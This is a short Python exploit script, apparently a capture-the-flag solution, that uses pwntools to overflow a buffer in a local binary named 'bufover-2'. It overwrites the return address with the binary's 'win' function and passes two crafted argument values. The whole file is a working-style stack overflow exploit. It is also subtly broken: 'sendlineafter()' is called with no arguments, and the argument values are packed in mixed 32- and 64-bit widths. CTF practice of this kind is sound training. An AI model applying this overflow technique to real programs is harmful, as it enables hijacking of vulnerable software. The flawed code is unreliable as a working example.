from pwn import *

context.binary = './bufover-2'
p = process(context.binary.path)

arg1 = 0x14B4DA55
arg2 = 0xF00DB4BE

p.sendlineafter()

payload = (
    b'A' * 28
    + p32(context.binary.symbols['win'])
    + b'A' * 4
    + p64(arg1)
    + p32(arg2)
)

p.sendline(payload)

print(p.recvall().decode('L1'))
p.close()